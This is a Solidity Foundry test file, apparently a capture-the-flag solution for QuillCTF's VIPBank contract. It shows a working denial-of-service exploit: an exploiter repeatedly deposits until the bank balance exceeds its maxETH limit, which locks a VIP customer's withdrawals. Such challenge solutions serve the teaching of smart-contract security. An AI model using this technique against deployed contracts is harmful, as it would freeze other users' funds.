// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import '../../src/QuillCTF/VIPBank.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract VIPBankExploit is Test {
  VIPBank target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');
  address alice = makeAddr('alice');

  function setUp() public {
    // Fund accounts
    vm.deal(alice, 1 ether);
    vm.deal(exploiter, 10 ether);

    // Deploy target contract
    vm.startPrank(deployer);
    target = new VIPBank();
    console2.log('Target contract deployed');
    target.addVIP(alice);
    console2.log('Alice is now a VIP');
    target.addVIP(exploiter);
    console2.log('Exploiter is now a VIP');
    vm.stopPrank();

    // Customer deposits funds
    vm.startPrank(alice);
    target.deposit{value: 0.05 ether}();
    console2.log('Alice deposits funds in the bank');
    vm.stopPrank();
  }

  function testExploit() public {
    vm.startPrank(exploiter);
    uint256 maxETH = target.maxETH();
    console2.log('Deposit funds in the contract until there is at least %d wei (%dx10^15 wei)', maxETH, maxETH * 1000 / (1 ether));
    console2.log('Bank balance: %d wei (%dx10^15 wei)', target.contractBalance(), target.contractBalance() * 1000 / (1 ether));
    while(target.contractBalance() <= maxETH) {
      target.deposit{value: 0.05 ether}();
      console2.log('Exploiter deposits 0.05 ether');
    }
    vm.stopPrank();
    console2.log('Bank balance: %d wei (%dx10^15 wei)', target.contractBalance(), target.contractBalance() * 1000 / (1 ether));

    vm.startPrank(alice);
    console2.log('Alice tries to withdraw funds without any success');
    vm.expectRevert('Cannot withdraw more than 0.5 ETH per transaction');
    target.withdraw(0.05 ether);
    vm.stopPrank();
  }
}
